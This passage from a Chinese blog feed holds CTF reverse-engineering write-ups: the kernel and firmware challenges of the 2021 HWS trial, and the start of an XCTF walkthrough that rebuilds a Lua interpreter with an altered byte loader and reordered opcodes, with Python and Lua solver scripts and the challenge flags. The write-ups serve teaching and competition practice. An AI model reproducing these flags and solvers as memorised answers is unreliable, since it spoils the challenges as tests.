class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    tmp1.append(((tmp2[i]&amp;<span class="number">0xf8</span>)&gt;&gt;<span class="number">3</span>)|((tmp2[(i<span class="number">-1</span>)&amp;<span class="number">0x1F</span>]&amp;<span class="number">0x07</span>)&lt;&lt;<span class="number">5</span>))</span><br><span class="line">v0=<span class="number">0</span></span><br><span class="line">arr=[]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    v0=(v0+<span class="number">17</span>)&amp;<span class="number">0x1F</span></span><br><span class="line">    arr.append(v0)</span><br><span class="line">flag=[<span class="string">&#x27;-&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">32</span>,<span class="number">2</span>):</span><br><span class="line">    flag[arr[i]],flag[arr[i+<span class="number">1</span>]]=<span class="built_in">chr</span>(tmp1[arr[i+<span class="number">1</span>]]),<span class="built_in">chr</span>(tmp1[arr[i]])</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span>.join(flag)</span><br><span class="line">print(md5(flag).hexdigest())</span><br></pre></td></tr></table></figure><p><strong>flag：751542a09b8b341dda23ebfc387a5e91</strong></p><h1 id="内核安全"><a href="#内核安全" class="headerlink" title="内核安全"></a>内核安全</h1><h2 id="easy-kernel"><a href="#easy-kernel" class="headerlink" title="easy_kernel"></a>easy_kernel</h2><p>是个ring3调用ring0的题（前半部分。</p><p>从ring3看起，v7是flag，走了sub_401005函数。</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201094904782.png"></p><p>跳到最后有</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201100043542.png"></p><p>int 2E，查了一下是用户模式进入内核模式的中断，于是去看ring0（即DriverXP.sys，调用号是186。</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201100538328.png"></p><p><img src="/p/wpFor-2021HWSTrial/image-20210201100525921.png"></p><p>可以看到这里有186，并且参数个数也是6个，猜测sub_401340就是调用的函数。</p><p>进一步可以看到，a1&#x3D;&#x3D;-1，刚好也吻合sub_401005的第一个参数。</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201100724932.png"></p><p>findcrypt可以看到DES，并且查交叉引用和反编译代码证实sub_401680就是DES加密过程。</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201100750395.png"></p><p>可以看到这边密钥只用了”}aglf_T_ton_5i_sihT_yrroS{galf”的前八字节。</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201101851117.png"></p><p>第一层加密确认，从ring3继续往下看。</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201102008518.png"></p><p>这个MEMORY[0x5804E8]实在是没看出来是什么，看汇编是call    fword ptr，查了一下是个长调用，返回用retf。</p><p>gdt表也懒得查，于是在ring3的汇编这里从头开始一个一个往下看retf，准备把碰到的都试一遍。</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201102641063.png"></p><p>诶，看到一个，转函数看看。</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201102802871.png"></p><p>代到exp里试了一下，发现成了，运气很好hhh，最开始这个就是MEMORY[0x5804E8]。</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201103052191.png"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">key=<span class="string">&#x27;&#125;aglf_T_ton_5i_sihT_yrroS&#123;galf&#x27;</span>[:<span class="number">8</span>]</span><br><span class="line">c=[<span class="number">0xB2</span>, <span class="number">0xC4</span>, <span class="number">0x86</span>, <span class="number">0xD5</span>, <span class="number">0x54</span>, <span class="number">0x6C</span>, <span class="number">0x38</span>, <span class="number">0xAD</span>, <span class="number">0xBD</span>, <span class="number">0x69</span>, <span class="number">0xD4</span>, <span class="number">0xE9</span>, <span class="number">0x44</span>, <span class="number">0x47</span>, <span class="number">0x36</span>, <span class="number">0x21</span>, <span class="number">0x99</span>, <span class="number">0x91</span>, <span class="number">0xFB</span>, <span class="number">0x13</span>, <span class="number">0x70</span>, <span class="number">0xD8</span>, <span class="number">0x6B</span>, <span class="number">0xE4</span>, <span class="number">0x80</span>, <span class="number">0x12</span>, <span class="number">0xE2</span>, <span class="number">0x43</span>, <span class="number">0x2A</span>, <span class="number">0x4B</span>, <span class="number">0x49</span>, <span class="number">0x8E</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    c[i]^=c[i+<span class="number">1</span>]</span><br><span class="line">cipher=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">chr</span>,c)))</span><br><span class="line">des=DES.new(key)</span><br><span class="line">flag=des.decrypt(cipher)</span><br><span class="line">print(flag)</span><br><span class="line">print(md5(flag).hexdigest())</span><br></pre></td></tr></table></figure><p><strong>flag：c1878dfb2b0c23c74ec4e6650d8f7004</strong></p><h1 id="固件安全"><a href="#固件安全" class="headerlink" title="固件安全"></a>固件安全</h1><h2 id="NodeMCU"><a href="#NodeMCU" class="headerlink" title="NodeMCU"></a>NodeMCU</h2><p><code>strings nodemcu.bin &gt; str.out</code>，导出字符串后直接查找flag即可</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201093735138.png"></p><p><strong>flag：6808dcf0-526e-11eb-92de-acde48001122</strong></p><h2 id="STM"><a href="#STM" class="headerlink" title="STM"></a>STM</h2><p>用bin2hex将bin文件转为hex文件，然后用ida加载hex。</p><p>查找STM的datasheet（以常见的STM32F103CB为参照）可知flash映射在0x08000000地址上</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201094121976.png"></p><p>于是载入ida的时候还要把基址改成0x08000000。</p><p>然后查找字符串，直接看Hello World的交叉引用，找到主函数。</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201094230080.png"></p><p><img src="/p/wpFor-2021HWSTrial/image-20210201094325844.png"></p><p>根据相应的函数功能猜测并命名，sub_8000314是加密函数。</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201094402786.png"></p><p>逻辑很简单，直接写exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arr=[<span class="number">0x7D</span>, <span class="number">0x77</span>, <span class="number">0x40</span>, <span class="number">0x7A</span>, <span class="number">0x66</span>, <span class="number">0x30</span>, <span class="number">0x2A</span>, <span class="number">0x2F</span>, <span class="number">0x28</span>, <span class="number">0x40</span>, <span class="number">0x7E</span>, <span class="number">0x30</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x2C</span>, <span class="number">0x2E</span>, <span class="number">0x2B</span>, <span class="number">0x28</span>, <span class="number">0x34</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, <span class="number">0x7C</span>, <span class="number">0x41</span>, <span class="number">0x34</span>, <span class="number">0x28</span>, <span class="number">0x33</span>, <span class="number">0x7E</span>, <span class="number">0x30</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x30</span>, <span class="number">0x7E</span>, <span class="number">0x2F</span>, <span class="number">0x31</span>, <span class="number">0x2A</span>, <span class="number">0x41</span>, <span class="number">0x7F</span>, <span class="number">0x2F</span>, <span class="number">0x28</span>, <span class="number">0x2E</span>, <span class="number">0x64</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> arr:</span><br><span class="line">    print(<span class="built_in">chr</span>((x^<span class="number">0x1E</span>)+<span class="number">3</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>flag{1749ac10-5389-11eb-90c1-001c427bd493}</strong></p>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【wp】2020XCTF_逆向</title>
      <link href="p/wpFor-2020XCTF/"/>
      <url>p/wpFor-2020XCTF/</url>
      
        <content type="html"><![CDATA[<p>前几天的XCTF最后一场终于打完了，三场比赛下来对逆向部分的大概感觉是从第一场的啥都不会做到后来的终于能有参与度了TvT，至少后两场的题目都是pc逆向，虽然特殊架构但好歹能做（tcl</p><p>本文是三场XCTF所有逆向题目的wp+复现整理。赛中拿到了7&#x2F;10的flag，很多是跟着队里的大佬做出来的（tqltql），这边就试着独立复现一下，至少打完应该长长记性（</p><p>官方wp出了，借助wp提供的思路复现填坑√。（9&#x2F;10）</p><a id="more"></a><p>1220那场的apk逆向还没复现完，因为博客要更新点配置所以就先放上来了qvq。</p><p>比赛官网：<a href="https://huaweictf2020.xctf.org.cn/">XCTF高校网络安全专题挑战赛</a></p><p>官方wp：</p><ol><li><a href="https://www.xctf.org.cn/library/details/b69108559ccd6ff0fa3ec79e3f2f198f121e90a8/">XCTF高校网络安全专题挑战赛-华为云专场 官方Writeup - XCTF社区</a></li><li><a href="https://www.xctf.org.cn/library/details/55599c9c17ea0e8ca0b094adbe075a03a7321599/">XCTF高校网络安全专题挑战赛-鲲鹏计算专场 官方Writeup - XCTF社区</a></li><li><a href="https://www.xctf.org.cn/library/details/5acdc1c31cf4935ac38fce445978888a5710cf11/">XCTF高校网络安全专题挑战赛-HarmonyOS和HMS专场 官方Writeup - XCTF社区</a></li></ol><hr><h1 id="12-20-华为云专场"><a href="#12-20-华为云专场" class="headerlink" title="[12.20] 华为云专场"></a>[12.20] 华为云专场</h1><h2 id="Weird-lua"><a href="#Weird-lua" class="headerlink" title="Weird_lua"></a>Weird_lua</h2><blockquote><p>根据官方wp，说是改了loadbyte和opcode顺序。这里假装没看过wp，看能不能分析出怎么看出来是这里魔改的。</p></blockquote><p>首先看附件是<code>lua</code>和<code>check_license_out.lua</code>，可以用file分别看一下</p><p><img src="/p/wpFor-2020XCTF/image-20210225152906252.png"></p><p><img src="/p/wpFor-2020XCTF/image-20210225152915828.png"></p><p>单独运行<code>./lua</code>，可以看到版本号是5.3.3</p><p><img src="/p/wpFor-2020XCTF/image-20210225160651288.png"></p><p>这里运行目标文件的方式是<code>./lua ./check_license_out.lua</code></p><p><img src="/p/wpFor-2020XCTF/image-20210225153920925.png"></p><p>感觉这个.lua文件实际可能是.luac文件，即lua字节码文件。</p><p>于是先随便写一个lua源码（除了不知名check以外，大致对目标文件<code>check_license_out.lua</code>进行复刻），用v5.3.3的lua（可以在lua官网<a href="http://www.lua.org/download.html">Lua: download</a>下载）编译成字节码，看看正常版和魔改版两个文件的区别。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- test.lua</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">(s)</span></span></span><br><span class="line">    <span class="keyword">local</span> <span class="built_in">len</span>=#s</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>==<span class="number">42</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Check!&quot;</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;length error&quot;</span></span><br><span class="line">    <span class="keyword">end</span> </span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.<span class="built_in">write</span>(<span class="string">&quot;input: &quot;</span>)</span><br><span class="line">str=<span class="built_in">io</span>.<span class="built_in">read</span>()</span><br><span class="line"><span class="built_in">print</span>(check(str))</span><br></pre></td></tr></table></figure><p>用<code>lua test.lua</code>运行：（注意这里是用正常的lua解释器而不是题目给的）</p><p><img src="/p/wpFor-2020XCTF/image-20210225154050280.png"></p><p>然后用<code>luac -o test.luac test.lua</code>得到<code>test.luac</code>字节码文件，然后把<code>check_license_out.lua</code>（上）和<code>test.luac</code>（下）用010Editor打开对比十六进制码。</p><p><img src="/p/wpFor-2020XCTF/image-20210225154521444.png"></p><p><img src="/p/wpFor-2020XCTF/image-20210225154542779.png"></p><p>可以看到，除了最开始的一字节为”1B”和”1C”以外，其余文件头中不同的字节都相差较大，感觉是某个特定的换算关系，位置看起来却没什么规律。</p><p>定位到<code>lua-5.3.3/src</code>文件夹中，有两个执行luac dump相关操作的头文件，分别是<code>ldump.h</code>（save precompiled Lua chunks）和<code>lundump.h</code>（load precompiled Lua chunks），这里猜测是用于load的<code>lundump.c</code>被魔改。</p><p><img src="/p/wpFor-2020XCTF/image-20210302235800922.png"></p><p>从这里（类似于主函数的函数）开始是整个的load步骤，可以看到上面对比中第一个差距比较大的字节是在0004h的位置，应该是在checkHeader部分，跟进这个<code>checkHeader()</code>函数。</p><p><img src="/p/wpFor-2020XCTF/image-20210303000036934.png"></p><p>237行是check文件头的<code>&quot;\x1bLua&quot;</code>部分（题目开头0x1c这个很容易看出就是硬改），而下面开始是check LUAC_VERSION即lua的版本号，本来应该是0x53，但是题目文件对应位置是0xAC，而且往后对照可以看到，不同字节部分都用了<code>LoadByte()</code>函数，猜测是在加载字节的时候有魔改，至于具体怎么魔改那可能得靠直觉了吧(。)，大概能靠猜？（或者看<code>lua</code>文件的反编译&#x3D; &#x3D;</p><p>在官方wp里，魔改的具体信息已经给了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> lu_byte <span class="title">LoadByte</span> <span class="params">(LoadState *S)</span> </span>&#123;</span><br><span class="line">    lu_byte x;</span><br><span class="line">    LoadVar(S, x);</span><br><span class="line">    <span class="comment">//x ^= 0xff; 此行为魔改部分</span></span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="跟着官方wp走不通的思路"><a href="#跟着官方wp走不通的思路" class="headerlink" title="跟着官方wp走不通的思路"></a>跟着官方wp走不通的思路</h3><p><strong>本部分可跳过</strong>，最后因为刚刚接触lua，对这个语言不熟悉，卡在创造不出帖子里提到的 <strong>“用于 dump 的函数，尽量覆盖所有的指令操作，否则只能提取出已有的指令”</strong> 的lua函数，帖子里的test无法在5.3版本的lua中提取出所有字节码，需要自己动手创造（。</p><p>因为这里LoadByte的魔改会影响到下一步的opcode顺序还原，所以要先把这些错误字节xor回去。</p><p>又因为LoadByte的更改只影响到部分字节，我们并不清楚具体哪些字节遭到了祸害，所以想到了一个比较笨的方法就是重新编译一个lua解释器，这样我们就有了opcode顺序魔改前的解释器和魔改后的解释器（题目所给的）。</p><p>（如果有师傅有更好的办法求告知&gt;&lt;）</p><p>将之前的<code>lua-5.3.3</code>文件夹复制到一个新路径，cd到文件夹中，执行<code>make clean</code>将文件中上一次的编译临时文件清空。<del>其实理论上说不复制出来也应该不会影响到原来的lua，但为了保险起见还是这么干吧。</del></p><p>然后把<code>lua-5.3.3/src/ldump.c</code>（注意文件名！！）的52-56行即<code>DumpByte()</code>函数部分改为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">DumpByte</span> <span class="params">(<span class="keyword">int</span> y, DumpState *D)</span> </span>&#123;</span><br><span class="line">  lu_byte x = (lu_byte)y;</span><br><span class="line">  x^=<span class="number">0xff</span>;<span class="comment">//增加此行</span></span><br><span class="line">  DumpVar(x, D);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存，退回到<code>lua-5.3.3</code>根目录下，在WSL中用<code>make linux</code>编译。</p><p>至于为什么是改<code>ldump.c</code>而不是改官方wp指定魔改的<code>lundump.c</code>，因为<code>ldump.c</code>的作用是保存字节码，而<code>lundump.c</code>的作用是加载字节码。这里参照<a href="https://bbs.pediy.com/thread-250618.htm">[原创]用 Lua 简单还原 OpCode 顺序</a>文中的方法进行还原。</p><p>帖子里的lua版本为v5.1.5，对这里v5.3.3并不能直接用（opcode有增加+有些5.3中新增的指令），需要对源码（<code>Check_OpCode/check_opcode.lua</code>）做一些修改，修改后的文件如下。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- check_opcode.lua</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> bit = <span class="built_in">require</span>(<span class="string">&#x27;bit&#x27;</span>)</span><br><span class="line"><span class="keyword">local</span> test = <span class="built_in">require</span>(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 加载用正常 lua 的 dump 文件</span></span><br><span class="line"><span class="keyword">local</span> fp = <span class="built_in">io</span>.<span class="built_in">open</span>(<span class="string">&quot;test.luac&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> ori_data = fp:<span class="built_in">read</span>(<span class="string">&quot;*all&quot;</span>)</span><br><span class="line">fp:<span class="built_in">close</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">-- print(&#x27;data len &#x27;.. #data)</span></span><br><span class="line"><span class="comment">-- print(&#x27;ori_data len &#x27; .. #ori_data)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> ori_op_name = &#123;</span><br><span class="line">    <span class="string">&quot;MOVE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LOADK&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LOADKX&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LOADBOOL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LOADNIL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;GETUPVAL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;GETTABUP&quot;</span>,</span><br><span class="line">    <span class="string">&quot;GETTABLE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;SETTABUP&quot;</span>,</span><br><span class="line">    <span class="string">&quot;SETUPVAL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;SETTABLE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;NEWTABLE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;SELF&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ADD&quot;</span>,</span><br><span class="line">    <span class="string">&quot;SUB&quot;</span>,</span><br><span class="line">    <span class="string">&quot;MUL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;MOD&quot;</span>,</span><br><span class="line">    <span class="string">&quot;POW&quot;</span>,</span><br><span class="line">    <span class="string">&quot;DIV&quot;</span>,</span><br><span class="line">    <span class="string">&quot;IDIV&quot;</span>,</span><br><span class="line">    <span class="string">&quot;BAND&quot;</span>,</span><br><span class="line">    <span class="string">&quot;BOR&quot;</span>,</span><br><span class="line">    <span class="string">&quot;BXOR&quot;</span>,</span><br><span class="line">    <span class="string">&quot;SHL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;SHR&quot;</span>,</span><br><span class="line">    <span class="string">&quot;UNM&quot;</span>,</span><br><span class="line">    <span class="string">&quot;BNOT&quot;</span>,</span><br><span class="line">    <span class="string">&quot;NOT&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LEN&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CONCAT&quot;</span>,</span><br><span class="line">    <span class="string">&quot;JMP&quot;</span>,</span><br><span class="line">    <span class="string">&quot;EQ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LT&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TEST&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TESTSET&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CALL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TAILCALL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;RETURN&quot;</span>,</span><br><span class="line">    <span class="string">&quot;FORLOOP&quot;</span>,</span><br><span class="line">    <span class="string">&quot;FORPREP&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TFORCALL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TFORLOOP&quot;</span>,</span><br><span class="line">    <span class="string">&quot;SETLIST&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CLOSURE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;VARARG&quot;</span>,</span><br><span class="line">    <span class="string">&quot;EXTRAARG&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">local</span> data = <span class="built_in">string</span>.<span class="built_in">dump</span>(test)<span class="comment">-- dump</span></span><br><span class="line"><span class="keyword">local</span> new_op = &#123;&#125;</span><br><span class="line"><span class="comment">-- 用目标 lua 和正常 lua 的 dump 数据对比</span></span><br><span class="line"><span class="keyword">for</span> i = <span class="number">2</span>, #data <span class="keyword">do</span></span><br><span class="line"><span class="keyword">local</span> by_ori = <span class="built_in">string</span>.<span class="built_in">byte</span>(ori_data,i)</span><br><span class="line"><span class="keyword">local</span> by_new = <span class="built_in">string</span>.<span class="built_in">byte</span>(data,i)</span><br><span class="line"><span class="keyword">if</span> by_ori ~= by_new <span class="keyword">then</span></span><br><span class="line">        <span class="comment">-- 字节码被xor 0xff处理</span></span><br><span class="line">        <span class="keyword">local</span> op_name = ori_op_name[by_ori + <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">local</span> op_idx = by_new</span><br><span class="line">        <span class="comment">-- if by_ori&gt;47 then</span></span><br><span class="line">        <span class="comment">--     op_name = ori_op_name[(by_ori~0xff) + 1]</span></span><br><span class="line">        <span class="comment">--     op_idx = (by_new~0xff)</span></span><br><span class="line">        <span class="comment">-- end</span></span><br><span class="line">        <span class="keyword">if</span> op_name~=<span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">if</span> new_op[op_name]~=<span class="literal">nil</span> <span class="keyword">and</span> new_op[op_name]~=op_idx <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">print</span>(op_name,new_op[op_name])</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">    new_op[op_name] = op_idx</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;old \t new \t name&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> idx, op_name <span class="keyword">in</span> <span class="built_in">pairs</span>(ori_op_name) <span class="keyword">do</span></span><br><span class="line"><span class="keyword">local</span> tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> new_op[op_name] ~= <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">tmp = new_op[op_name]</span><br><span class="line">        cnt=cnt+<span class="number">1</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="built_in">print</span>((idx - <span class="number">1</span>) .. <span class="string">&quot;\t&quot;</span> .. tmp .. <span class="string">&quot;\t&quot;</span> .. op_name )</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="built_in">print</span>(cnt)</span><br></pre></td></tr></table></figure><p>将题目附件的<code>lua</code>重命名为<code>lua_problem</code>并复制到<code>Check_OpCode</code>文件夹中，同时将刚刚xor了字节的<code>lua-5.3.3/src/lua</code>也复制过来。</p><p><img src="/p/wpFor-2020XCTF/image-20210303223220203.png"></p><p>P.S. 由于帖子中给出的<code>test.lua</code>与前文中最开始用到的lua文件重名，故以下<code>test.lua</code>均代表为帖子中的lua文件，前文中的<code>test.lua</code>不再被引用。</p><p>依次在WSL中运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./lua dump_test_luac.lua</span><br><span class="line">./lua_problem check_opcode.lua</span><br></pre></td></tr></table></figure><p>（然后发现写不出能覆盖所有字节码的<code>test()</code>，遂放弃该思路。</p><h3 id="自创思路"><a href="#自创思路" class="headerlink" title="自创思路"></a>自创思路</h3><p>我们知道在lua源码里，opcode是按顺序存放在<code>lopcodes.h</code>和<code>lopcodes.c</code>里的，故顺序魔改其实可以追踪lua解释器在ida中的反编译即可。（这里的<code>lua</code>就是题目给的那个。</p><p>源码中的opcode处：</p><p><img src="/p/wpFor-2020XCTF/image-20210304125916447.png"></p><p><img src="/p/wpFor-2020XCTF/image-20210304125958675.png"></p><p>将<code>lua</code>加载进ida中，用<code>shift+F12</code>提取字符串，并用<code>ctrl+F</code>搜索“MOVE”</p><p><img src="/p/wpFor-2020XCTF/image-20210304130048988.png"></p><p>双击，按<code>x</code>找到交叉引用</p><p><img src="/p/wpFor-2020XCTF/image-20210304130133374.png"></p><p><img src="/p/wpFor-2020XCTF/image-20210304130146457.png"></p><p>这里就是魔改后的opcode顺序！</p><p>那么我们现在就掌握了所有魔改的信息，开始恢复还原。</p><p>这里用到的是著名的lua反汇编&#x2F;反编译项目<a href="https://github.com/viruscamp/luadec">viruscamp&#x2F;luadec: Lua Decompiler for lua 5.1 , 5.2 and 5.3</a>，由于lua解释器被魔改（xor 0xff和opcode顺序），所以我们需要在原安装步骤的基础上做些调整。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/viruscamp/luadec</span><br><span class="line">cd luadec</span><br><span class="line">git submodule update --init lua-5.3</span><br><span class="line">cd lua-5.3</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##### 此处在make之前需要调整源码！</span></span></span><br><span class="line">make linux</span><br><span class="line">cd ../luadec</span><br><span class="line">make LUAVER=5.3</span><br></pre></td></tr></table></figure><p>调整源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 